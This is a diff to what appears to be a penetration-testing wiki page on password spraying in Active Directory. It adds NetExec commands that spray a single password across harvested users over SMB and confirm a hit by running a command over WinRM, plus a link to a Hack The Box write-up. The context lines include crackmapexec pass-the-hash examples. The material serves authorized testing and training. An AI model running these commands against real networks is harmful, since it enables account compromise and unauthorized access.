@@ -44,6 +44,23 @@ crackmapexec smb <IP> -u users.txt -p passwords.txt
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
 
+- Using **NetExec (CME successor)** for targeted, low-noise spraying across SMB/WinRM:
+
+```bash
+# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
+netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts
+
+# Spray a single candidate password against harvested users over SMB
+netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
+  --continue-on-success --no-bruteforce --shares
+
+# Validate a hit over WinRM (or use SMB exec methods)
+netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"
+
+# Tip: sync your clock before Kerberos-based auth to avoid skew issues
+sudo ntpdate <DC_FQDN>
+```
+
 - Using [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
 
 ```bash
@@ -265,6 +282,7 @@ To use any of these tools, you need a user list and a password / a small list of
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 - [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
 
 
 {{#include ../../banners/hacktricks-training.md}}
